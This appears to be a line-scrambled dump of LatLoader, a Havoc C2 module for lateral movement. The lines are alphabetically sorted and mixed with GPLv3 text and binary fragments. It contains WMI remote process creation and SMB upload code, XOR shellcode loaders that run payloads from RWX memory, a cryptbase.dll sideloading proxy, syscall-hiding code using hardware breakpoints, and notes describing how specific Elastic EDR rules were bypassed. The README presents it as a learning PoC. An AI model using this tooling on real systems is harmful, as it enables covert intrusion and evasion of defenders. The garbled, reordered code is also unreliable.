+"       RPC_C_AUTHN_LEVEL_PKT_PRIVACY,  // RPC_C_AUTHN_LEVEL_xxx "
+"       RPC_C_AUTHZ_DEFAULT,            // RPC_C_AUTHZ_xxx"
+"       RPC_C_IMP_LEVEL_IMPERSONATE,    // RPC_C_IMP_LEVEL_xxx"
+"       pSvc,                           // Indicates the proxy to set"
+"       userAcct,                       // client identity"
+"      BeaconPrintf(CALLBACK_OUTPUT, ""Terminal failure: Unable to open file "
+"      BeaconPrintf(CALLBACK_OUTPUT, ""Terminal failure: Unable to write to file."
+"      printf(""Terminal failure: Unable to write to file."
+"      printf(TEXT(""Terminal failure: Unable to open file "
+"    ""keep intact all notices""."
+"    (including a physical distribution medium), accompanied by a"
+"    (including a physical distribution medium), accompanied by the"
+"    // Allocate memory according to size, and read contents of file into buffer"
+"    // Dynamically search for a suitable ""ADD RSP,68"
+"    // allocate RWX memory, copy decoded shellcode, and free heap memory"
+"    //BSTR srv = SysAllocString(L"""
+"    //Getting the Win32_ProcessStartup class definition. One of the parameters to the Win32_Process.Create() is a of type Win32_ProcessStartup, so we must create an object of that type and fill it"
+"    //Let's now fill the the pStartupInstance instance, remember that after we fill it, we need to add it to the pParamsInstance"
+"    //We cannot ignore this step because the ""Put"" method later on will check for the parameter names."
+"    BOOL result = Original_SystemFunction036(buffer, len)"
+"    BSTR srv = SysAllocStringLen(0, wslen)"
+"    BSTR wcClassName = SysAllocString(L""Win32_Process"")"
+"    BSTR wcCommandExecute = SysAllocStringLen(0, wslen)"
+"    BSTR wcMethodName = SysAllocString(L""Create"")"
+"    BSTR wcStartup = SysAllocString(L""Win32_ProcessStartup"")"
+"    Corresponding Source, you remain obligated to ensure that it is"
+"    GetConsoleMode(hStdin, "
+"    GetThreadContext_t pGetThreadContext = (GetThreadContext_t)GetSymbolAddress(GetModuleAddress((LPWSTR)L""KERNEL32.DLL""), ""GetThreadContext"")"
+"    License will therefore apply, along with any applicable section 7"
+"    MultiByteToWideChar(CP_ACP, 0, argv[2], strlen(argv[2]), wcCommandExecute, wslen)"
+"    MultiByteToWideChar(CP_ACP, 0, targetHost, strlen(targetHost), srv, wslen)"
+"    SetConsoleMode(hStdin, mode "
+"    SetThreadContext_t pSetThreadContext = (SetThreadContext_t)GetSymbolAddress(GetModuleAddress((LPWSTR)L""KERNEL32.DLL""), ""SetThreadContext"")"
+"    SystemFunction036_Type Original_SystemFunction036 = (SystemFunction036_Type)GetProcAddress(LoadLibrary(""C:"
+"    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f""Perfoming lateral movement with provided exe..."" )"
+"    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f""Perfoming lateral movement with xor shellcode loader via DLL sideloading..."" )"
+"    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f""Perfoming lateral movement with xor shellcode loader..."" )"
+"    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f""Tasked demon to copy {params[1]} to {remotePath} on {target} via SMB"")"
+"    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f""Tasked demon to run {command} on {target} via wmi"" )"
+"    This is free software, and you are welcome to redistribute it"
+"    This program is distributed in the hope that it will be useful,"
+"    _In_ HANDLE hThread,"
+"    a) Convey the object code in, or embodied in, a physical product"
+"    additional terms, to the whole of the work, and all its parts,"
+"    along with this program.  If not, see <https://www.gnu.org/licenses/>."
+"    alternative is allowed only occasionally and noncommercially, and"
+"    b) Convey the object code in, or embodied in, a physical product"
+"    c) Prohibiting misrepresentation of the origin of that material, or"
+"    c) You must license the entire work, as a whole, under this"
+"    conveying of source, or (2) access to copy the"
+"    copy the object code is a network server, the Corresponding Source"
+"    d) If the work has interactive user interfaces, each must display"
+"    decode(shellcode, key, strlen(key), size)"
+"    def addWstr(self, s):"
+"    def addbool(self, b):"
+"    def addbytes(self, b):"
+"    def addshort(self, n):"
+"    def addstr(self, s):"
+"    def adduint32(self, n):"
+"    demon.InlineExecute( TaskID, ""go"", f""bin/ProcCreate.{demon.ProcessArch}.o"", packer.getbuffer(), False )"
+"    demon.InlineExecute( TaskID, ""go"", f""bin/writefileBOF.{demon.ProcessArch}.o"", packer.getbuffer(), False )"
+"    e) Convey the object code using peer-to-peer transmission, provided"
+"    exceptionHandlerHandle = AddVectoredExceptionHandler(1, "
+"    f = open(params[1], ""rb"")"
+"    file = fopen(fileName, ""rb"")"
+"    file = open(infile, 'rb')"
+"    file = open(outfile, ""wb"")"
+"    fseek(file, 0, SEEK_END)"
+"    hNtdll = (HANDLE)GetModuleAddress((LPWSTR)L""ntdll.dll"")"
+"    hres =  CoInitializeEx(0, COINIT_MULTITHREADED)"
+"    hres = pClass->GetMethod(wcMethodName, 0, "
+"    hres = pInParamsDefinition->SpawnInstance(0, "
+"    hres = pStartupObject->SpawnInstance(0, "
+"    hres = pSvc->ExecMethod(wcClassName, wcMethodName, 0, NULL, pParamsInstance, "
+"    hres = pSvc->GetObject(wcClassName, 0, NULL, "
+"    hres = pSvc->GetObject(wcStartup, 0, NULL, "
+"    if (!pSetThreadContext(myThread, "
+"    if key == """" or key == None:"
+"    int bytes_read = fread(shellcode, sizeof(unsigned char), size, file)"
+"    int j = snprintf(targetHost, 32, """
+"    int wslen = MultiByteToWideChar(CP_ACP, 0, targetHost, strlen(targetHost), 0, 0)"
+"    interfaces that do not display Appropriate Legal Notices, your"
+"    it) with contractual assumptions of liability to the recipient, for"
+"    it, and giving a relevant date."
+"    math(shellcode, key, strlen(key), size)"
+"    mbstowcs(wa,text,size)"
+"    medium customarily used for software interchange, for a price no"
+"    memcpy(base_addr, decoded, size)"
+"    memcpy(exec, decoded, size)"
+"    model, to give anyone who possesses the object code either (1) a"
+"    newParams = (targetHost, ""bin/loader.exe"", ""C:"
+"    newParams = (targetHost, ""bin/signed_sideloader.dll"", ""C:"
+"    newParams = (targetHost, ""bin/xordemon.bin"", ""C:"
+"    newParams = (targetHost, ""cmd.exe /c C:"
+"    newParams = (targetHost, ""cmd.exe /c copy C:"
+"    newParams = (targetHost, targetFile, ""C:"
+"    only if you received the object code with such an offer, in accord"
+"    pGetThreadContext(myThread, "
+"    permission to license the work in any other way, but it does not"
+"    place (gratis or for a charge), and offer equivalent access to the"
+"    print(f""["
+"    print(f""[debug] [exec] params: {params}"")"
+"    print(f""[debug] [load] params: {params}"")"
+"    print(f""[debug] [rupload] params: {params}"")"
+"    print(f""[debug] [sideload] params: {params}"")"
+"    print(f""[debug] [xorload] params: {params}"")"
+"    printf(""Attemping to read %s"
+"    printf(""["
+"    printf(""argv[1]: %s"
+"    printf(""argv[2]: %s"
+"    printf(""targetHost: %s"
+"    product that is covered by this License, on a durable physical"
+"    remotePath = params[2].split("":"")[1]"
+"    retGadgetAddress = FindInModule(""KERNEL32.DLL"", (PBYTE)"""
+"    smb_writefile(demonID, newParams)"
+"    status = pNtAllocateVirtualMemory(GetCurrentProcess(), "
+"    std::cout << ""Connected to ROOT"
+"    std::cout << ""["
+"    that supports equivalent copying facilities, provided you maintain"
+"    the Free Software Foundation, either version 3 of the License, or"
+"    trade names, trademarks, or service marks"
+"    unsigned char key[] = ""OPERATORCHANGEMEPLZZZ"""
+"    wmi_proccreate(demonID, newParams)"
+"    written offer, valid for at least three years and valid for as"
+"    wslen = MultiByteToWideChar(CP_ACP, 0, argv[2], strlen(argv[2]), 0, 0)"
+"    xorencode(demonFile, XOR_KEY, ""bin/xordemon.bin"")"
+"  ""Additional permissions"" are terms that supplement the terms of this"
+"  ""Copyright"" also means copyright-like laws that apply to other kinds of"
+"  ""Installation Information"" for a User Product means any methods,"
+"  ""The Program"" refers to any copyrightable work licensed under this"
+"  ""This License"" refers to version 3 of the GNU General Public License."
+"  // Allocate memory according to size, and read contents of file into buffer"
+"  //char DataBuffer[] = ""This is some test data to write to the file."""
+"  A ""Standard Interface"" means an interface that either is an official"
+"  A ""User Product"" is either (1) a ""consumer product"", which means any"
+"  A ""contributor"" is a copyright holder who authorizes use under this"
+"  A ""covered work"" means either the unmodified Program or a work based"
+"  A contributor's ""essential patent claims"" are all patent claims"
+"  A patent license is ""discriminatory"" if it does not include within"
+"  A separable portion of the object code, whose source code is excluded"
+"  Additional terms, permissive or non-permissive, may be stated in the"
+"  All other non-permissive additional terms are considered ""further"
+"  An ""entity transaction"" is a transaction transferring control of an"
+"  An interactive user interface displays ""Appropriate Legal Notices"""
+"  BeaconPrintf(CALLBACK_OUTPUT, ""dwBytesToWrite: %d"", dwBytesToWrite)"
+"  BeaconPrintf(CALLBACK_OUTPUT, ""remotePath: %s"", remotePath)"
+"  BeaconPrintf(CALLBACK_OUTPUT, ""targetHost: %s"", targetHost)"
+"  Corresponding Source conveyed, and Installation Information provided,"
+"  DWORD                 dwCreationDisposition,"
+"  DWORD                 dwDesiredAccess,"
+"  DWORD                 dwFlagsAndAttributes,"
+"  DWORD                 dwShareMode,"
+"  DWORD        nNumberOfBytesToWrite,"
+"  Each contributor grants you a non-exclusive, worldwide, royalty-free"
+"  Each time you convey a covered work, the recipient automatically"
+"  Finally, every program is threatened constantly by software patents."
+"  For example, if you distribute copies of such a program, whether"
+"  For the developers' and authors' protection, the GPL clearly explains"
+"  HANDLE       hFile,"
+"  However, if you cease all violation of this License, then your"
+"  If conditions are imposed on you (whether by court order, agreement or"
+"  If the program does terminal interaction, make it output a short"
+"  If you add terms to a covered work in accord with this section, you"
+"  If you convey a covered work, knowingly relying on a patent license,"
+"  If you convey an object code work under this section in, or with, or"
+"  If you develop a new program, and you want it to be of the greatest"
+"  If, pursuant to or in connection with a single transaction or"
+"  In the following three paragraphs, a ""patent license"" is any express"
+"  LPCSTR                lpFileName,"
+"  LPCVOID      lpBuffer,"
+"  LPDWORD      lpNumberOfBytesWritten,"
+"  LPSECURITY_ATTRIBUTES lpSecurityAttributes,"
+"  MSVCRT$sprintf(filePath, """
+"  Moreover, your license from a particular copyright holder is"
+"  Notwithstanding any other provision of this License, for material you"
+"  Notwithstanding any other provision of this License, you have"
+"  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY"
+"  The ""Corresponding Source"" for a work in object code form means all"
+"  The ""System Libraries"" of an executable work include anything, other"
+"  The ""source code"" for a work means the preferred form of the work"
+"  The GNU General Public License is a free, copyleft license for"
+"  The precise terms and conditions for copying, distribution and"
+"  To ""convey"" a work means any kind of propagation that enables other"
+"  To ""modify"" a work means to copy from or adapt all or part of the work"
+"  To ""propagate"" a work means to do anything with it that, without"
+"  To do so, attach the following notices to the program.  It is safest"
+"  To protect your rights, we need to prevent others from denying you"
+"  When we speak of free software, we are referring to freedom, not"
+"  When you convey a copy of a covered work, you may at your option"
+"  When you convey a covered work, you waive any legal power to forbid"
+"  You may charge any price or no price for each copy that you convey,"
+"  You may convey a work based on the Program, or the modifications to"
+"  You may make, run and propagate covered works that you do not"
+"  You should also get your employer (if you work as a programmer) or school,"
+"  bErrorFlag = KERNEL32$WriteFile(hFile, DataBuffer, dwBytesToWrite, "
+"  bErrorFlag = WriteFile(hFile, DataBuffer, dwBytesToWrite, "
+"  file = fopen(fileName, ""rb"
+"  fseek(file, 0, SEEK_END)"
+"  hFile = CreateFile(argv[2], GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)"
+"  hFile = KERNEL32$CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)"
+"  int bytes_read = fread(DataBuffer, sizeof(unsigned char), size, file)"
+"  printf(""Attemping to read %s"
+"  printf(TEXT(""Writing %d bytes to %s."
+" //This is the name of the propoerty, we can't change it!"
+" Change cryptbase extension via WMI, avoiding elastic ""Lateral Tool via SMB"" alert"
+" Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>"
+" Cwbmstr = OLEAUT32$SysAllocString(L""{4590f811-1d3a-11d0-891f-00aa004b2e24}"")"
+" Identifies processes executed via Windows Management Instrumentation (WMI) on a remote host. This could be indicative of adversary lateral movement, but could be noisy if administrators use WMI to remotely manage hosts."
+" Identifies the transfer of a library via SMB followed by loading it into commonly DLL proxy execution binaries such as rundll32, regsvr32 and shared services via svchost.exe. This may indicate an attempt to remotely execute malicious code."
+" Iwbmstr = OLEAUT32$SysAllocString(L""{dc12a687-737f-11cf-884d-00aa004b2e24}"")"
+" This rule was bypassed by creating the file via SMB with a safe extension like .png, and then making a copy of the file with it's real extension via WMI."
+" This rule was bypassed by executing the transferred file using cmd.exe /c. This evades the rule because the file is not executed directly, but instead by a trusted binary."
+" This rule was bypassed by including a path in our command that the rule excludes. As seen in the query, "
+" WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)"
+" [@C5spider](https://twitter.com/C5pider), [@s4ntiago_p](https://twitter.com/s4ntiago_p), and all other contributors to the [Havoc C2 Framework](https://github.com/HavocFramework/Havoc)."
+" and then load the module into Havoc using the script manager. To view help in Havoc, run "
+" arg, int a_len)"
+" args, int length) {"
+" authInfo, COAUTHIDENTITY"
+" authidentity, wchar_t"
+" bMask, const char"
+" buff, int len) {"
+" buff, int len)"
+" buffer, ULONG len)"
+" buffer, int length)"
+" buffer, int size)"
+" call using hardware breakpoints. This is not effective against any EDRs that rely on kernel callbacks for detecting winapi usage (Elastic, MDE, etc). However, I have included it as a PoC to demonstrate how it could be used against other EDRs which still rely on hooking. If you would like to use a version of the sideloader without HWBP syscalls, simply modify the makefile to compile "
+" data, int len)"
+" domain, int IsCurrent) {"
+" dst, int max)"
+" file = fopen(fileName, ""rb"
+" file = fopen(fileName, ""rb"")"
+" fmt, ...)"
+" for a GUI interface, you would use an ""about box""."
+" format, char "
+" format, int "
+" format, int maxsz)"
+" format, int value)"
+" however, if the Program has interactive"
+" i), bMask, szMask))"
+" installed. Additionally, you must have [osslsigncode](https://github.com/mtrojnar/osslsigncode) installed to provide cert signing for the DLL utilized by the "
+" is one of these directories, which was appended to each wmi command like so: "
+" lpsz, LPCLSID pclsid)"
+" lpsz, LPIID lpiid)"
+" names[j]), functionName) == 0) {"
+" of this license document, but changing it is not allowed."
+" pData, const BYTE"
+" pInfo, char "
+" pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR"
+" pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities)"
+" parser, char "
+" parser, int "
+" password, wchar_t"
+" payload, int p_len, int p_offset, char "
+" sInfo, PROCESS_INFORMATION "
+" src, wchar_t "
+" subcommand is the full-featured PoC of this module. It will attempt to perform lateral movement via DLL sideloading while evading default Elastic EDR rules. For a full list of every rule evaded by this module and how it was done, please see the below section titled [Elastic EDR Rule Evasions](https://github.com/icyguider/LatLoader"
+" subcommand. Once all dependencies are installed, simply type "
+" text, int len)"
+" textSection->VirtualAddress, textSection->SizeOfRawData, bMask, szMask)"
+" user, wchar_t"
+""" for write."
+""" gadget in kernel32 or kernelbase. InitHWSyscalls failed."")"
+""" opcode address"
+""" opcode address: 0x%I64X"
+""""" )"
+"""3Yz"
+"""ADD RSP,68"
+"""AzRI{U"
+"""Major Component"", in this context, means a major essential component"
+"""Td@w"
+"""[K>x"
+"""aggregate"" if the compilation and its resulting copyright are not"
+"""cmd.exe /c whoami > C:"
+"""recipients"" may be individuals or organizations."
+"""syscall"
+"""whoami > c:"
+"""x6r"
+"$(CC_x64) src/loader.c -static -w -s -Wl,-subsystem,windows -o bin/loader.exe"
+"'W""k.H"
+"(1) assert copyright on the software, and (2) offer you this License"
+"(if any) on which the executable work runs, or a compiler used to"
+"(kernel, window system, and so on) of the specific operating system"
+")""NtAllocateVirtualMemory"")"
+")(ExceptionInfo->ContextRecord->Rcx), ntFunctionAddress)"
+")KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY))"
+")KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHINFO))"
+", serve as the main mechanism for executing the provided BOFs. The 3 other subcommands ("
+", you must account for Elastic's in memory detection [yara rule](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Havoc.yar) for Havoc. This can be bypassed by modifying the Havoc framework itself with relative ease. I will leave the specifics of this process to the reader. "
+",=w<$"
+",BeV"
+",S NE@9"
+". To view help for subcommands, run "
+"// @janoglezcampos, @idov31 - https://github.com/Idov31/Cronos/blob/master/src/Utils.c"
+"// Take formatted target, user and password from beacon"
+"// sideload options: compmgmtlauncher.exe, disksnapshot.exe, filehistory.exe, quickassist.exe"
+"// x86_64-w64-mingw32-gcc loader.c -static -w -s -Wl,-subsystem,windows -o loader.exe"
+"// x86_64-w64-mingw32-gcc sideloader.c cryptbase.def -static -w -s -Wl,-subsystem,windows -shared -o /share/sideloader.dll"
+"//BSTR wcCommandExecute = OLEAUT32$SysAllocString(L""cmd.exe /c "
+"//Getting the Win32_ProcessStartup class definition. One of the parameters to the Win32_Process.Create() is a of type Win32_ProcessStartup, so we must create an object of that type and fill it"
+"//Let's now fill the the pStartupInstance instance, remember that after we fill it, we need to add it to the pParamsInstance"
+"//We cannot ignore this step because the ""Put"" method later on will check for the parameter names."
+"1, s)"
+"11 of the WIPO copyright treaty adopted on 20 December 1996, or"
+"2, s)"
+"4k9"""
+"8""BH>KI0s"
+":8F"""
+":=2p8,aZ""aJ"
+"= pack(fmt, 1 if b else 0)"
+"= pack(fmt, len(b), b)"
+"= pack(fmt, len(s)"
+"= pack(fmt, n)"
+"ALL NECESSARY SERVICING, REPAIR OR CORRECTION."
+"BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)"
+"BSTR wcClassName = OLEAUT32$SysAllocString(L""Win32_Process"")"
+"BSTR wcCommandLine = OLEAUT32$SysAllocString(L""CommandLine"")"
+"BSTR wcCurrentDirectory = OLEAUT32$SysAllocString(L""CurrentDirectory"")"
+"BSTR wcMethodName = OLEAUT32$SysAllocString(L""Create"")"
+"BSTR wcProcessStartupInfo = OLEAUT32$SysAllocString(L""ProcessStartupInformation"")"
+"BSTR wcShowWindow = OLEAUT32$SysAllocString(L""ShowWindow"")"
+"BSTR wcStartup = OLEAUT32$SysAllocString(L""Win32_ProcessStartup"")"
+"BeaconPrintf(CALLBACK_ERROR, ""CoCreateInstance failed: 0x%08x"", hr)"
+"BeaconPrintf(CALLBACK_ERROR, ""CoInitializeEx failed: 0x%08lx"", hr)"
+"BeaconPrintf(CALLBACK_ERROR, ""CoSetProxyBlanket failed: 0x%08x"", hr)"
+"BeaconPrintf(CALLBACK_ERROR, ""ConnectServer failed: 0x%08x"", hr)"
+"BeaconPrintf(CALLBACK_ERROR, ""ExecMethod failed: 0x%08x"", hr)"
+"BeaconPrintf(CALLBACK_ERROR, ""GetMethod failed: 0x%08x"", hr)"
+"BeaconPrintf(CALLBACK_ERROR, ""GetObject failed: 0x%08x"", hr)"
+"BeaconPrintf(CALLBACK_ERROR, ""GetObject2 failed: 0x%08x"", hr)"
+"BeaconPrintf(CALLBACK_ERROR, ""SpawnInstance failed: 0x%08x"", hr)"
+"BeaconPrintf(CALLBACK_ERROR, ""SpawnInstance2 failed: 0x%08x"", hr)"
+"BeaconPrintf(CALLBACK_OUTPUT, ""ExecMethod Succeeded!"")"
+"BeaconPrintf(CALLBACK_OUTPUT, ""IsCurrent: %d"", IsCurrent)"
+"BeaconPrintf(CALLBACK_OUTPUT, ""bwcommandline: %s"", bwcommandline)"
+"BeaconPrintf(CALLBACK_OUTPUT, ""bwdomain: %s"", bwdomain)"
+"BeaconPrintf(CALLBACK_OUTPUT, ""bwpassword: %s"", bwpassword)"
+"BeaconPrintf(CALLBACK_OUTPUT, ""bwtarget2: %s"", bwtarget2)"
+"BeaconPrintf(CALLBACK_OUTPUT, ""bwusername: %s"", bwusername)"
+"C$%s"", targetHost, remotePath)"
+"CIMV2 WMI namespace"" << std::endl"
+"CIMV2"")"
+"CIMV2"", argv[1])"
+"CRYPTBASE.dll""), ""SystemFunction036"")"
+"Component, and (b) serves only to enable use of the work with that"
+"Corresponding Source of the work from the predecessor in interest, if"
+"DECLSPEC_IMPORT BOOL   BeaconSpawnTemporaryProcess (BOOL x86, BOOL ignoreToken, STARTUPINFO "
+"DECLSPEC_IMPORT void   BeaconGetSpawnTo(BOOL x86, char "
+"DECLSPEC_IMPORT void   BeaconInjectProcess(HANDLE hProc, int pid, char "
+"DECLSPEC_IMPORT void   BeaconOutput(int type, char "
+"DECLSPEC_IMPORT void   BeaconPrintf(int type, char "
+"DWORD64 FindSyscallReturnAddress(DWORD64 functionAddress, WORD syscallNumber) {"
+"DWORD64 FindSyscallReturnAddress(DWORD64 functionAddress, WORD syscallNumber)"
+"DWORD_PTR FindInModule(LPCSTR moduleName, PBYTE bMask, PCHAR szMask)"
+"DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask)"
+"Finally, the "
+"For more information on this, and how to apply and follow the GNU GPL, see"
+"GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE"
+"GNU General Public License, you may choose any version ever published"
+"HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY"
+"IHUxiaI5w$,,"
+"IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF"
+"Im,["
+"LatLoader exec dc1 ""cmd.exe /c whoami > C:"
+"LatLoader is a PoC module to demonstrate automated lateral movement with the Havoc C2 framework. The main purpose of this project is to help others learn BOF and Havoc module development. This project can also help others understand basic EDR rule evasions, particularly when performing lateral movement."
+"License and any other pertinent obligations, then as a consequence you may"
+"License will continue to apply to the part which is the covered work,"
+"License, you may add to a covered work material governed by the terms"
+"License.  Each licensee is addressed as ""you"".  ""Licensees"" and"
+"Major Component, or to implement a Standard Interface for which an"
+"NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)"
+"N{""q>"
+"OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,"
+"OLE32$CLSIDFromString(Cwbmstr, "
+"OLE32$CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID"
+"OLE32$CoInitializeEx(LPVOID, DWORD)"
+"OLE32$IIDFromString(Iwbmstr, "
+"PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),"
+"Program, unless a warranty or assumption of liability accompanies a"
+"Public License ""or any later version"" applies to it, you have the"
+"Public License instead of this License.  But first, please read"
+"RET"" gadget in both kernel32 and kernelbase"
+"RegisterCommand( load, ""LatLoader"", ""load"", ""Upload file over SMB and execute it via WMI"", 0, ""target local_file"", ""dc1 /root/test.exe"")"
+"RegisterCommand( sideload, ""LatLoader"", ""sideload"", ""Perform lateral movement by DLL sideloading a simple shellcode loader with evasions for Elastic EDR rules"", 0, ""target raw_demon_file"", ""dc1 /root/demon.x64.bin"")"
+"RegisterCommand( smb_writefile, ""LatLoader"", ""rupload"", ""Upload a file over SMB"", 0, ""target local_file remote_path"", ""dc1 /root/test.exe C:"
+"RegisterCommand( wmi_proccreate, ""LatLoader"", ""exec"", ""Execute a file or command via WMI"", 0, ""target command"", ""dc1 "
+"RegisterCommand( xorload, ""LatLoader"", ""xorload"", ""Perform lateral movement using a simple shellcode loader"", 0, ""target raw_demon_file"", ""dc1 /root/demon.x64.bin"")"
+"RegisterModule( ""LatLoader"", ""Laterally move via WMI using a simple shellcode loader"", """", ""[subcommand] (args)"", """", """"  )"
+"System Libraries, or general-purpose tools or generally available free"
+"SystemFunction001=""c:"
+"SystemFunction002=""c:"
+"SystemFunction003=""c:"
+"SystemFunction004=""c:"
+"SystemFunction005=""c:"
+"SystemFunction028=""c:"
+"SystemFunction029=""c:"
+"SystemFunction034=""c:"
+"SystemFunction036=""c:"
+"SystemFunction040=""c:"
+"SystemFunction041=""c:"
+"THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY"
+"The LatLoader module contains 5 different subcommands. The first two, "
+"The exe can then be transferred to the target and executed like so, providing arguments via the cli:"
+"UINT64 GetSymbolAddress(UINT64 moduleBase, const char"
+"UPDATE: 10 days after the release of this tool, Elastic updated some of its rules to address the bypasses demonstrated by this project. Please see the [Oct 17th commit](https://github.com/elastic/protections-artifacts/commit/7310e500a6178b6d9f5c189f9ac8de155037836f) in their [protections-artifacts](https://github.com/elastic/protections-artifacts) repo to view the changes made to applicable rules (Like [this one](https://github.com/elastic/protections-artifacts/commit/7310e500a6178b6d9f5c189f9ac8de155037836f"
+"WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS"
+"XOR_KEY = ""OPERATORCHANGEMEPLZZZ"""
+"['4g""<v"
+"] Cleaned up the exception handler."" << std::endl"
+"] File encoded successfully! Saved to: {outfile}"")"
+"] Here is your key: {key}"")"
+"] Moving RCX to R10 (mov r10, rcx)"
+"] Moving SSN to RAX (mov rax, 0x%X)"
+"] NtAllocateVirtualMemory result: "" << status << std::endl"
+"_Vb""Qo,l"
+"__format, ...)"
+"__stream, const char "
+"a computer network, with no transfer of a copy, is not conveying."
+"above cannot be given local legal effect according to their terms,"
+"actual knowledge that, but for the patent license, your conveying the"
+"actually uses, or expects or is expected to use, the product.  A product"
+"add to a covered work, you may (if authorized by the copyright holders of"
+"additional permissions on material, added by you to a covered work,"
+"additional terms that apply to those files, or a notice indicating"
+"agreement or commitment, however denominated, not to enforce a patent"
+"and control, on terms that prohibit them from making any copies of"
+"and which are not combined with it such as to form a larger program,"
+"any patent claim is infringed by making, using, selling, offering for"
+"apply only to part of the Program, that part may be used separately"
+"arrangement, you convey, or propagate by procuring conveyance of, a"
+"authInfo, "
+"authidentity, bwusername, bwpassword, bwdomain, IsCurrent)"
+"authors' sake, the GPL requires that modified versions be marked as"
+"available, or (2) arrange to deprive yourself of the benefit of the"
+"base_addr, 0, "
+"be similar in spirit to the present version, but may differ in detail to"
+"be treated as though they were included in this License, to the extent"
+"but the special requirements of the GNU Affero General Public License,"
+"by this License, of making, using, or selling its contributor version,"
+"cache"")"
+"certain responsibilities if you distribute copies of the software, or if"
+"changed, so that their problems will not be attributed erroneously to"
+"combined work, and to convey the resulting work.  The terms of this"
+"commercial, industrial or non-consumer uses, unless such uses represent"
+"computer or modifying a private copy.  Propagation includes copying,"
+"consistent with the requirements of this License, to extend the patent"
+"contain the covered work, unless you entered into that arrangement,"
+"content, constitutes a covered work.  This License acknowledges your"
+"control those activities.  However, it does not include the work's"
+"convey, without conditions so long as your license otherwise remains"
+"conveyed by you (or copies made from those copies), or (b) primarily"
+"copyright holder, and you cure the violation prior to 30 days after"
+"copyright on the Program, and are irrevocable provided the stated"
+"covered work in a country, or your recipient's use of the covered work"
+"covered work is covered by this License only if the output, given its"
+"covered work, and grant a patent license to some of the parties"
+"covered work, you indicate your acceptance of this License to do so."
+"cryptbase.SystemFunction001"" @1"
+"cryptbase.SystemFunction002"" @2"
+"cryptbase.SystemFunction003"" @3"
+"cryptbase.SystemFunction004"" @4"
+"cryptbase.SystemFunction005"" @5"
+"cryptbase.SystemFunction028"" @6"
+"cryptbase.SystemFunction029"" @7"
+"cryptbase.SystemFunction034"" @8"
+"cryptbase.SystemFunction036"" @9"
+"cryptbase.SystemFunction040"" @10"
+"cryptbase.SystemFunction041"" @11"
+"cryptbase.png"")"
+"def load(demonID, "
+"def sideload(demonID, "
+"def smb_writefile( demonID, "
+"def wmi_proccreate( demonID, "
+"def xorencode(infile, key, outfile):"
+"def xorload(demonID, "
+"define DEBUG_PRINT( STR, ... ) printf(STR)"
+"define DEBUG_PRINT( STR, ... )"
+"define HWSYSCALLS_DEBUG 0 // 0 disable, 1 enable"
+"distribution (with or without modification), making available to the"
+"dwBytesWritten, NULL)"
+"earlier work or a work ""based on"" the earlier work."
+"encoded, unsigned char key[], int keylen, int long size)"
+"exact copy.  The resulting work is called a ""modified version"" of the"
+"exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)"
+"extent that warranties are provided), that licensees may convey the"
+"extern ""C"" __declspec(dllexport) DWORD SystemFunction036_Proxy(void"
+"extern ""C"" {"
+"fF,]m6N"
+"fP9hb""y4]"
+"feature that (1) displays an appropriate copyright notice, and (2)"
+"fileName = ""C:"
+"finally terminates your license, and (b) permanently, if the copyright"
+"fixed term (regardless of how the transaction is characterized), the"
+"for a work that has been modified or installed by the recipient, or for"
+"for making modifications to it.  ""Object code"" means any non-source"
+"for you must do so exclusively on your behalf, under your direction"
+"form of a separately written license, or stated as exceptions"
+"free programs, and that you know you can do these things."
+"freedoms that you received.  You must make sure that they, too, receive"
+"from havoc import Demon, RegisterCommand, RegisterModule"
+"from the Corresponding Source as a System Library, need not be"
+"give under the previous paragraph, plus a right to possession of the"
+"giving you legal permission to copy, distribute and/or modify it."
+"gratis or for a fee, you must pass on to the recipients the same"
+"hereafter acquired, that would be infringed by some manner, permitted"
+"hex_formated.append(""{:02x}"".format(test)) "
+"hr = OLE32$CoCreateInstance(Cwbm, 0, CLSCTX_INPROC_SERVER, Iwbm, (void"
+"hr = OLE32$CoInitializeEx(0, COINIT_APARTMENTTHREADED)"
